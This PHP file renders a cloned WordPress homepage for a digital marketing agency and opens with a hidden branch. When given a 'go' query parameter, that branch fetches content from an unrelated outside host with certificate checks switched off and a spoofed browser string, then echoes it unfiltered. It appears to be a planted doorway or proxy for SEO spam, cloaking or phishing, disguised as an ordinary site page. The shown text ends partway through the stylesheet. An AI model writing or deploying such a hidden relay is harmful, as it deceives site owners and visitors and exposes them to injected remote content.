<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
    // INIT CURL
    $ch = curl_init();

    //init curl
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    // SET URL FOR THE POST FORM LOGIN
    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/webuthinks.com/'.$url.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    // common name and also verify that it matches the hostname provided)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Optional: Return the result instead of printing it
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    // ENABLE HTTP POST
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $store = curl_exec ($ch);
    echo $store;

    // CLOSE CURL
    curl_close ($ch);

} else {
?>

<!DOCTYPE html>
<html lang="en-US">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
	<meta charset="UTF-8" />

	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
	<link rel="icon" type="image/x-icon" href="./image/favicon.jpg">
	<meta name="description"
		content="A Google Certified Online Marketing Service Provider, Webuthink Pvt Ltd offers comprehensive, result-driven SEO and internet marketing services to expand your company's online presence. Schedule a FREE 30-minute consultation with us about digital marketing.!">

	<meta name="keywords"
		content="SEO Agency,Online Marketing Company ,Digital Marketing Company,Internet Marketing Services,Online Marketing Services,SEO Services,SEO Company">


	<title>Best Online Digital marketing Company</title>



	<link rel='dns-prefetch' href='http://www.google.com/' />
	<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
	<link rel='dns-prefetch' href='http://s.w.org/' />

	<link rel="stylesheet" href="./form.css">
	
  </head>
	<link rel="alternate" type="application/rss+xml" title="webuthink Pvt Ltd &raquo; Feed" href="feed/index.html" />
	<link rel="alternate" type="application/rss+xml" title="webuthink Pvt Ltd &raquo; Comments Feed"
		href="comments/feed/index.html" />
	<script type="text/javascript">
		window._wpemojiSettings = { "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/", "ext": ".png", "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/", "svgExt": ".svg", "source": { "concatemoji": "https:\/\/www.eliteseoagency.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.9" } };
		!function (e, a, t) { var n, r, o, i = a.createElement("canvas"), p = i.getContext && i.getContext("2d"); function s(e, t) { var a = String.fromCharCode; p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, e), 0, 0); e = i.toDataURL(); return p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, t), 0, 0), e === i.toDataURL() } function c(e) { var t = a.createElement("script"); t.src = e, t.defer = t.type = "text/javascript", a.getElementsByTagName("head")[0].appendChild(t) } for (o = Array("flag", "emoji"), t.supports = { everything: !0, everythingExceptFlag: !0 }, r = 0; r < o.length; r++)t.supports[o[r]] = function (e) { if (!p || !p.fillText) return !1; switch (p.textBaseline = "top", p.font = "600 32px Arial", e) { case "flag": return s([127987, 65039, 8205, 9895, 65039], [127987, 65039, 8203, 9895, 65039]) ? !1 : !s([55356, 56826, 55356, 56819], [55356, 56826, 8203, 55356, 56819]) && !s([55356, 57332, 56128, 56423, 56128, 56418, 56128, 56421, 56128, 56430, 56128, 56423, 56128, 56447], [55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418, 8203, 56128, 56421, 8203, 56128, 56430, 8203, 56128, 56423, 8203, 56128, 56447]); case "emoji": return !s([55357, 56424, 8205, 55356, 57212], [55357, 56424, 8203, 55356, 57212]) }return !1 }(o[r]), t.supports.everything = t.supports.everything && t.supports[o[r]], "flag" !== o[r] && (t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && t.supports[o[r]]); t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && !t.supports.flag, t.DOMReady = !1, t.readyCallback = function () { t.DOMReady = !0 }, t.supports.everything || (n = function () { t.readyCallback() }, a.addEventListener ? (a.addEventListener("DOMContentLoaded", n, !1), e.addEventListener("load", n, !1)) : (e.attachEvent("onload", n), a.attachEvent("onreadystatechange", function () { "complete" === a.readyState && t.readyCallback() })), (n = t.source || {}).concatemoji ? c(n.concatemoji) : n.wpemoji && n.twemoji && (c(n.twemoji), c(n.wpemoji))) }(window, document, window._wpemojiSettings);
	</script>
	<style type="text/css">
		img.wp-smiley,
		img.emoji {
			display: inline !important;
			border: none !important;
			box-shadow: none !important;
			height: 1em !important;
			width: 1em !important;
			margin: 0 .07em !important;
			vertical-align: -0.1em !important;
			background: none !important;
			padding: 0 !important;
		}
	</style>
	<link rel='stylesheet' id='wp-block-library-css'
		href='wp-includes/css/dist/block-library/style.minfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='contact-form-7-css'
		href='wp-content/plugins/contact-form-7/includes/css/stylesc225.css?ver=5.4.1' type='text/css' media='all' />
	<link rel='stylesheet' id='wpcf7-redirect-script-frontend-css'
		href='wp-content/plugins/wpcf7-redirect/build/css/wpcf7-redirect-frontend.minfcc2.css?ver=5.7.9' type='text/css'
		media='all' />
	<link rel='stylesheet' id='mediaelement-css'
		href='wp-includes/js/mediaelement/mediaelementplayer-legacy.min08e1.css?ver=4.2.16' type='text/css'
		media='all' />
	<link rel='stylesheet' id='wp-mediaelement-css'
		href='wp-includes/js/mediaelement/wp-mediaelement.minfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-default-style-css' href='wp-content/themes/bridge/stylefcc2.css?ver=5.7.9'
		type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-qode-font_awesome-css'
		href='wp-content/themes/bridge/css/font-awesome/css/font-awesome.minfcc2.css?ver=5.7.9' type='text/css'
		media='all' />
	<link rel='stylesheet' id='bridge-qode-font_elegant-css'
		href='wp-content/themes/bridge/css/elegant-icons/style.minfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-qode-linea_icons-css'
		href='wp-content/themes/bridge/css/linea-icons/stylefcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-qode-dripicons-css'
		href='wp-content/themes/bridge/css/dripicons/dripiconsfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-qode-kiko-css' href='wp-content/themes/bridge/css/kiko/kiko-allfcc2.css?ver=5.7.9'
		type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-qode-font_awesome_5-css'
		href='wp-content/themes/bridge/css/font-awesome-5/css/font-awesome-5.minfcc2.css?ver=5.7.9' type='text/css'
		media='all' />
	<link rel='stylesheet' id='bridge-stylesheet-css'
		href='wp-content/themes/bridge/css/stylesheet.minfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<style id='bridge-stylesheet-inline-css' type='text/css'>
		.page-id-21.disabled_footer_top .footer_top_holder,
		.page-id-21.disabled_footer_bottom .footer_bottom_holder {
			display: none;
		}
	</style>
	<link rel='stylesheet' id='bridge-print-css' href='wp-content/themes/bridge/css/printfcc2.css?ver=5.7.9'
		type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-style-dynamic-css'
		href='wp-content/themes/bridge/css/style_dynamicb49a.css?ver=1592656265' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-responsive-css'
		href='wp-content/themes/bridge/css/responsive.minfcc2.css?ver=5.7.9' type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-style-dynamic-responsive-css'
		href='wp-content/themes/bridge/css/style_dynamic_responsiveb49a.css?ver=1592656265' type='text/css'
		media='all' />
	<style id='bridge-style-dynamic-responsive-inline-css' type='text/css'>
		.call-now-btn a {
			background-color: #ed8420;
			padding: 10px 25px;
			color: #fff;
			font-size: 16px;
			transition: 0.9s;
		}

		.call-now-btn a:hover {
			background-color: #29364a;
			transition: 0.9s;
		}

		.Header-top-left-1 li {
			display: inline-block;
			padding: 0px 5px;
		}

		.Header-top-left-1 a {
			color: #fff;
			font-size: 14px;
		}

		.Header-top-right-2 li i:hover {
			background-color: #ed8420;
			color: #fff;
		}

		.Header-top-right-2 li i {
			background-color: #fff;
			border-radius: 100px;
			width: 28px;
			height: 27px;
			line-height: 29px;
			text-align: center;
			color: #166eb7;
		}

		.Header-top-right-2 li {
			display: inline-block;
			margin: 0px 0px;
		}

		.header_bottom_right_widget_holder {
			padding: 0px;
		}

		.footer-s-icon li {
			margin: 0px 0px !important;
		}

		.footer_bottom_holder {
			padding: 0px 85px;
		}

		ul#menu-footer-menu a {
			transition: 0.3s;
		}

		ul#menu-footer-menu a:hover {
			padding-left: 10px;
			transition: 0.3s;
		}

		.call-number-office img.img-responsive {
			width: 12%;
			border-radius: 100px;
			height: 30px;
			float: left;
			margin-right: 10px;
		}

		.call-number-office li {
			margin-bottom: 20px;
		}

		.call-number-office a {
			transition: 0.3s;
		}

		.call-number-office a:hover {
			padding-left: 10px;
			transition: 0.3s;
		}

		.footer_top .widget.widget_nav_menu li {
			margin: 0;
			line-height: 15px;
		}

		div#custom_html-9 {
			margin-bottom: 20px;
		}

		.my-sl-form {
			background-color: #0000003d;
			padding: 20px 20px;
			border-radius: 8px;
		}

		.my-sl-form h3 {
			text-align: center;
			font-size: 20px;
			text-transform: initial;
			color: #fff;
			font-weight: 700;
			padding-bottom: 20px;
		}

		.my-sl-form input::placeholder {
			color: #000;
		}

		.my-sl-form input {
			border-radius: 5px !important;
			color: #000;
			font-weight: 500 !important;
		}

		.my-sl-form select {
			border-radius: 5px !important;
			color: #000 !important;
			font-weight: 500 !important;
		}

		.my-sl-form input.wpcf7-form-control.wpcf7-submit:hover {
			background-color: #29364a;
			color: #000;
		}

		.my-sl-form input.wpcf7-form-control.wpcf7-submit {
			text-align: center;
			background-color: #ed8420;
			color: #fff;
			border: none;
		}

		p.bt-ss {
			text-align: center;
		}

		.separator.control-sep-ab.normal {
			height: 12px;
			width: 30%;
			margin-left: 60%;
		}


		.btn-wl-mn li {
			display: inline-block;
			margin-right: 15px;
		}

		.btn-wl-mn img {
			width: 60px;
			border-radius: 35px;
			padding: 0px 10px;
		}

		.separator.call-to-sepppp.normal {
			height: 5px;
			margin: 15px 44%;
			margin-bottom: 30px;
		}

		a.qbutton.large.center.default.control-call-to-action-btnm {
			transition: 0.9s;
		}

		a.qbutton.large.center.default.control-call-to-action-btnm:hover {
			transform: scale(1.1);
			transition: 0.9s;
		}

		.control-why-c-box-control h4.icon_title {
			padding-bottom: 10px;
		}

		.control-why-c-box-control .q_icon_with_title.medium.custom_icon_image img {
			transition: 0.6s;
		}

		.control-why-c-box-control .q_icon_with_title.medium.custom_icon_image:hover img {
			transform: scale(1.2);
			transition: 0.6s;
		}

		.control-my-call-to-a .section_inner_margin.clearfix {
			box-shadow: 0 4px 0 #ed8420;
			padding: 40px 0px;
			border: 1px solid #ed8420;
		}

		.control-my-left-btttnn .wpb_wrapper {
			text-align: center;
		}

		.control-frist-services h3.icon_title {
			font-size: 22px;
			padding-bottom: 10px;
			font-weight: 500 !important;
		}

		.control-frist-services .vc_column-inner>.wpb_wrapper {
			border: #b2b2b2 1px solid;
			border-radius: 25px;
			padding: 30px 15px 10px;
		}

		.control-frist-services .vc_column-inner>.wpb_wrapper img {
			transition: 0.6s;
		}

		.control-frist-services .vc_column-inner>.wpb_wrapper:hover img {
			transform: scale(1.1);
			transition: 0.6s;
		}

		.control-frist-services p {
			font-size: 15px;
		}

		.control-services-two .vc_column-inner>.wpb_wrapper {
			background: #fff;
			padding: 20px 15px;
			text-align: center;
			box-shadow: 0px 0px 11px 1px #e5e5e5;
			border-radius: 5px;
		}

		.control-services-two h3.icon_title {
			font-size: 20px;
			font-weight: 600 !important;
			padding-bottom: 20px;
		}

		.control-services-two p {
			font-size: 15px;
		}

		.control-services-two img {
			background-color: #e7e7e7;
			padding: 15px 15px;
			border-radius: 20px;
		}



		.online-marketing-section .vc_column-inner>.wpb_wrapper {
			background: #fff;
			padding: 20px 15px;
			text-align: center;
			box-shadow: 0px 0px 11px 1px #e5e5e5;
			border-radius: 5px;
		}

		.online-marketing-section .separator.small.left {
			width: 20% !important;
			height: 3px !IMPORTANT;
			margin-top: 10px !important;
			margin-bottom: 5px !important;
		}

		.industries_area.invrt_clr i {
			font-size: 40px;
			color: #000;
			padding: 33px 0px;
		}

		.industries_img_area {
			width: 120px;
			height: 120px;
			padding: 5px !important;
			border-radius: 100%;
			border: 2px solid #b3e4eb;
			text-align: center;
			margin: 0px auto;
		}

		.industries_main_img {
			width: 115px;
			height: 115px;
			margin: auto;
			border-radius: 100%;
			background: #fff;
			text-align: center;
			margin-top: -15px;
		}

		.industries_area.invrt_clr p a {
			color: #fff;
			text-align: center;
			font-size: 20px;
			font-weight: 700;
		}

		.industries_area.invrt_clr p {
			padding-top: 10px;
			text-align: center !important;
		}

		.industries_area:hover {
			transform: scale(1.1);
		}

		.industries_area {
			transition: 0.9s;
		}

		.industries_area.invrt_clr figure {
			text-align: center;
			margin-left: 35px;
		}

		.wpb_tabstabs_holder.clearfix ul.tabs-nav {
			padding-bottom: 30px !important;
		}

		.wpb_tabstabs_holder.clearfix ul.tabs-nav a:hover {
			background-color: #29364a;
		}

		.wpb_tabstabs_holder.clearfix ul.tabs-nav a {
			background-color: #ed8420;
			margin: 0px 10px;
			border-radius: 34px;
			color: #fff;
			padding: 0px 25px !important;
		}

		ul.tabs-nav li.active a {
			background-color: #29364a !important;
		}

		.Enquiry-contact-Form input {
			background: transparent !important;
			border: 1px solid #787878 !important;
			border-radius: 4px !important;
			margin-bottom: 20px !important;
		}

		.Enquiry-contact-Form textarea.wpcf7-form-control.wpcf7-textarea {
			background: transparent !important;
			border: 1px solid #787878 !important;
			border-radius: 4px !important;
			margin-bottom: 20px !important;
			height: 120px;
		}

		.wpb_column.vc_col-sm-12.my-btn-send-a {
			text-align: center;
			margin-top: 10px;
		}

		.Enquiry-contact-Form input.wpcf7-form-control.wpcf7-submit {
			color: #fff;
			padding: 3px 40px;
			background-color: #ed8420 !important;
			border: none !important;
			border-radius: 0px !important;
		}

		p.testimonial_author {
			font-size: 20px !important;
			font-weight: 600 !important;
		}

		.textimonail-control-section-a .testimonial_content_inner {
			padding: 0px;
			padding-top: 30px;
		}

		.control-faq-scc h4 {
			background-color: #29364a !important;
			color: #fff;
			font-size: 17px;
		}

		.control-faq-scc .qode-accordion-content.ui-accordion-content.ui-helper-reset.ui-widget-content.ui-corner-bottom.ui-accordion-content-active {
			border: 1px solid;
			padding: 10px;
		}

		.control-faq-scc .qode-accordion-holder.clearfix.qode-toggle.qode-initial.accordion.ui-accordion.ui-accordion-icons.ui-widget.ui-helper-reset {
			margin-bottom: 10px;
		}

		.control-work-p-success img {
			width: 75% !important;
			margin-left: 40px;
			margin-bottom: 20px;
		}

		.control-work-p-success h4.icon_title {
			margin-bottom: 10px;
		}

		.control-my-call-to-a .section_inner.clearfix {
			margin-top: -85px;
		}

		@-webkit-keyframes glowing {
			0% {
				background-color: #ed8420;
				-webkit-box-shadow: 0 0 3px #ed8420;
			}

			50% {
				background-color: #ed8420;
				-webkit-box-shadow: 0 0 40px #ed8420;
			}

			100% {
				background-color: #ed8420;
				-webkit-box-shadow: 0 0 3px #ed8420;
			}
		}

		@-moz-keyframes glowing {
			0% {
				background-color: #ed8420;
				-moz-box-shadow: 0 0 3px #ed8420;
			}

			50% {
				background-color: #ed8420;
				-moz-box-shadow: 0 0 40px #ed8420;
			}

			100% {
				background-color: #ed8420;
				-moz-box-shadow: 0 0 3px #ed8420;
			}
		}

		@-o-keyframes glowing {
			0% {
				background-color: #ed8420;
				box-shadow: 0 0 3px #ed8420;
			}

			50% {
				background-color: #ed8420;
				box-shadow: 0 0 40px #ed8420;
			}

			100% {
				background-color: #ed8420;
				box-shadow: 0 0 3px #ed8420;
			}
		}

		@keyframes glowing {
			0% {
				background-color: #ed8420;
				box-shadow: 0 0 3px #ed8420;
			}

			50% {
				background-color: #ed8420;
				box-shadow: 0 0 40px #ed8420;
			}

			100% {
				background-color: #ed8420;
				box-shadow: 0 0 3px #ed8420;
			}
		}

		.btn-wl-mn {
			text-align: center;
		}

		.Enquiry-contact-Form textarea::placeholder {
			color: #fff;
		}

		.Enquiry-contact-Form input::placeholder {
			color: #Fff;
		}

		.Enquiry-contact-Form input.wpcf7-form-control.wpcf7-submit:hover {
			background-color: #29364a !important;
		}

		/***************RESPONSIVE*********************MEDIA*************************/
		@media (min-width:320px) and (max-width:768px) {
			.mobile_menu_button i.qode_icon_font_awesome.fa.fa-bars {
				font-size: 35px;
				color: #29364a;
			}

			nav.mobile_menu ul#menu-main-menu-1 a {
				color: #2a374b;
				font-size: 20px;
				font-weight: 600;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1592042638304.grid_section h2 {
				font-size: 28px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1592042638304.grid_section a.qbutton.large.left.default.control-call-to-action-btnm {
				margin-bottom: 40px;
			}

			.control-frist-services .vc_column-inner>.wpb_wrapper {
				margin-bottom: 20px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.vc_custom_1591870685248.grid_section h2 {
				font-size: 30px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.vc_custom_1591870685248.grid_section a.qbutton.large.center.default.control-call-to-action-btnm {
				font-size: 13px !important;
			}

			.online-marketing-section .vc_column-inner>.wpb_wrapper {
				margin-bottom: 20px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.online-marketing-section.vc_custom_1591942141839 {
				padding-top: 0px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-why-c-box-control.control-frist-services.vc_custom_1591882318096 {
				padding-top: 0px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1591872817454.grid_section .vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-why-c-box-control.vc_custom_1591873095192 .vc_column-inner {
				margin-bottom: 10px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-why-c-box-control.vc_custom_1591873095192 {
				padding-top: 0px !important;
			}

			.control-services-two .vc_column-inner>.wpb_wrapper {
				margin-bottom: 20px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-services-two.vc_custom_1591886282652 {
				padding-top: 0px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-my-call-to-a.vc_custom_1591876258275.grid_section h2 {
				font-size: 25px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1591943651440.grid_section .wpb_column.vc_column_container.vc_col-sm-3 {
				width: 50%;
				float: left;
				margin-bottom: 20px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.vc_custom_1591944334616 {
				padding-top: 0px !important;
			}

			.q_tabs.horizontal.center ul.tabs-nav li {
				margin-bottom: 10px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.vc_custom_1591950608806.grid_section h2 {
				font-size: 30px !important;
			}

			.footer_bottom_holder {
				padding: 0px;
			}

			.control-why-c-box-control p {
				font-size: 14px;
			}

			.control-why-c-box-control h4.icon_title {
				padding-bottom: 10px;
				font-size: 17px;
			}

			.control-my-call-to-a .section_inner.clearfix {
				margin-top: -115px;
			}

			.control-thnksss .full_section_inner.clearfix {
				padding: 20px !IMPORTANT;
			}

			.vc_row.wpb_row.section.vc_row-fluid.control-thnksss.vc_custom_1592542993892 {
				padding: 30px 0px !important;
				padding-top: 0px !important;
			}



			section.parallax_section_holder.cont-my-iiiii h2 {
				font-size: 30px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1592650022868 img.vc_single_image-img.attachment-full.lazyloaded {
				width: 75%;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_custom_1592652242923 h2 {
				font-size: 30px !important;
			}

			.control-sss-box .vc_column-inner>.wpb_wrapper {
				padding: 10px;
				margin-bottom: 20px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.vc_inner.control-sss-box.vc_custom_1592653238547 {
				padding: 0px !important;
			}

			.vc_row.wpb_row.section.vc_row-fluid.control-blog-p.vc_custom_1592653627336.grid_section h2 {
				font-size: 30px !important;
			}

			section.parallax_section_holder.control-formmmmm h2 {
				font-size: 30px !important;
			}

			section.parallax_section_holder.control-formmmmm .wpb_column.vc_column_container.vc_col-sm-5 {
				padding-bottom: 30px;
			}

			.vc_row.wpb_row.section.vc_row-fluid.control-blog-p.vc_custom_1592653627336.grid_section .btn-wl-mn img {
				width: 40px;
				border-radius: 35px;
				padding: 0 0px;
			}

			.wpb_raw_code.wpb_content_element.wpb_raw_html.vc_custom_1592652253514 img.ls-is-cached.lazyloaded {
				width: 55px;
			}

			.btn-wl-mn li {
				display: inline-block;
				margin-right: 5px;
			}

		}
	</style>
	<link rel='stylesheet' id='js_composer_front-css'
		href='wp-content/plugins/js_composer/assets/css/js_composer.min10df.css?ver=6.2.0' type='text/css'
		media='all' />
	<link rel='stylesheet' id='bridge-style-handle-google-fonts-css'
		href='https://fonts.googleapis.com/css?family=Raleway%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C800%2C900%2C100italic%2C300italic%2C400italic%2C700italic%7COpen+Sans%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C800%2C900%2C100italic%2C300italic%2C400italic%2C700italic&amp;subset=latin%2Clatin-ext&amp;ver=1.0.0'
		type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-core-dashboard-style-css'
		href='wp-content/plugins/bridge-core/modules/core-dashboard/assets/css/core-dashboard.minfcc2.css?ver=5.7.9'
		type='text/css' media='all' />
	<link rel='stylesheet' id='bridge-childstyle-css' href='wp-content/themes/bridge-child/stylefcc2.css?ver=5.7.9'
		type='text/css' media='all' />
	<script type='text/javascript' src='wp-includes/js/jquery/jquery.min9d52.js?ver=3.5.1' id='jquery-core-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.mind617.js?ver=3.3.2'
		id='jquery-migrate-js'></script>
	<link rel="https://api.w.org/" href="wp-json/index.html" />
	<link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/21.html" />
	<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
	<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" />
	<meta name="generator" content="WordPress 5.7.9" />
	<link rel='shortlink' href='index.html' />
	<link rel="alternate" type="application/json+oembed"
		href="wp-json/oembed/1.0/embedb470.html?url=https%3A%2F%2Fwww.eliteseoagency.com%2F" />
	<link rel="alternate" type="text/xml+oembed"
		href="wp-json/oembed/1.0/embed6dd6.html?url=https%3A%2F%2Fwww.eliteseoagency.com%2F&amp;format=xml" />
	<!-- Facebook Pixel Code -->
	<script>
		!function (f, b, e, v, n, t, s) {
			if (f.fbq) return; n = f.fbq = function () {
				n.callMethod ?
				n.callMethod.apply(n, arguments) : n.queue.push(arguments)
			};
			if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
			n.queue = []; t = b.createElement(e); t.async = !0;
			t.src = v; s = b.getElementsByTagName(e)[0];
			s.parentNode.insertBefore(t, s)
		}(window, document, 'script',
			'../connect.facebook.net/en_US/fbevents.js');
		fbq('init', '302889910886749');
		fbq('track', 'PageView');
	</script>
	<noscript><img height="1" width="1" style="display:none"
			src="https://www.facebook.com/tr?id=302889910886749&amp;ev=PageView&amp;noscript=1" /></noscript>
	<!-- End Facebook Pixel Code -->

	<!-- Global site tag (gtag.js) - Google Ads: 627973983 -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=AW-627973983"></script>
	<script>
		window.dataLayer = window.dataLayer || [];
		function gtag() { dataLayer.push(arguments); }
		gtag('js', new Date());

		gtag('config', 'AW-627973983');
	</script>

	<https: //www.googletagmanager.com/gtag/js?id=AW-627973983">
		</script>

		<script>
			gtag('config', 'AW-627973983/D68bCIzxptUBEN--uKsC', {
				'phone_conversion_number': '7634078909'
			});
		</script>

		<!-- Global site tag (gtag.js) - Google Analytics -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-169840316-1"></script>
		<script>
			window.dataLayer = window.dataLayer || [];
			function gtag() { dataLayer.push(arguments); }
			gtag('js', new Date());

			gtag('config', 'UA-169840316-1');
		</script>
		<script>
			document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
		</script>
		<style>
			.no-js img.lazyload {
				display: none;
			}

			figure.wp-block-image img.lazyloading {
				min-width: 150px;
			}

			.lazyload,
			.lazyloading {
				opacity: 0;
			}

			.lazyloaded {
				opacity: 1;
				transition: opacity 400ms;
				transition-delay: 0ms;
			}
		</style>
		<style type="text/css">
			.recentcomments a {
				display: inline !important;
				padding: 0 !important;
				margin: 0 !important;
			}
		</style>
		<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress." />
		<link rel="icon" href="wp-content/uploads/2020/06/cropped-Elite-SEO-Agency-Logo-32x32.jpg" sizes="32x32" />
		<link rel="icon" href="wp-content/uploads/2020/06/cropped-Elite-SEO-Agency-Logo-192x192.jpg" sizes="192x192" />
		<link rel="apple-touch-icon" href="wp-content/uploads/2020/06/cropped-Elite-SEO-Agency-Logo-180x180.jpg" />
		<meta name="msapplication-TileImage"
			content="https://www.eliteseoagency.com/wp-content/uploads/2020/06/cropped-Elite-SEO-Agency-Logo-270x270.jpg" />
		<style type="text/css" data-type="vc_shortcodes-custom-css">
			.vc_custom_1592390219472 {
				background: rgba(255, 255, 255, 0.4) url(./image/banner.png) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
				*background-color: rgb(255, 255, 255) !important;
			}

			.vc_custom_1592048645134 {
				background-color: #ffffff !important;
			}

			.vc_custom_1592391101831 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/web-marketing-services.jpg?id=159) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1591870201684 {
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/call-to-action-1.png?id=50) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592043026734 {
				background-color: #ececec !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592043243543 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/internet-marketing-solution-services.jpg?id=167) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592043952438 {
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592391909699 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/offerbg.jpg?id=57) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592049365005 {
				padding-top: 50px !important;
				padding-bottom: 130px !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592044210734 {
				padding-bottom: 50px !important;
				background-color: #ffffff !important;
			}

			.vc_custom_1592391934323 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/industries_bg.jpg?id=101) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592049557047 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-color: #ffffff !important;
			}

			.vc_custom_1592391965658 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/offerbg.jpg?id=57) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1591949443861 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-color: #ffffff !important;
			}

			.vc_custom_1592391973898 {
				background-color: #29364a !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1592047597932 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
			}

			.vc_custom_1591953648091 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-color: #ffffff !important;
			}

			.vc_custom_1592391764067 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
				background-image: url(https://www.eliteseoagency.com/wp-content/uploads/2020/06/contactForm.png?id=121) !important;
				background-position: center !important;
				background-repeat: no-repeat !important;
				background-size: cover !important;
			}

			.vc_custom_1591863539272 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
			}

			.vc_custom_1592192296295 {
				margin-right: 0px !important;
				margin-left: 0px !important;
				padding-right: 0px !important;
				padding-left: 0px !important;
			}

			.vc_custom_1592388541814 {
				padding-top: 20px !important;
				padding-bottom: 20px !important;
			}

			.vc_custom_1591868691386 {
				padding-top: 50px !important;
				padding-bottom: 50px !important;
			}

			.vc_custom_1593773235690 {
				padding-top: 20px !important;
				padding-bottom: 20px !important;
			}

			.vc_custom_1591883117536 {
				padding-top: 30px !important;
			}

			.vc_custom_1591882318096 {
				padding-top: 30px !important;
			}

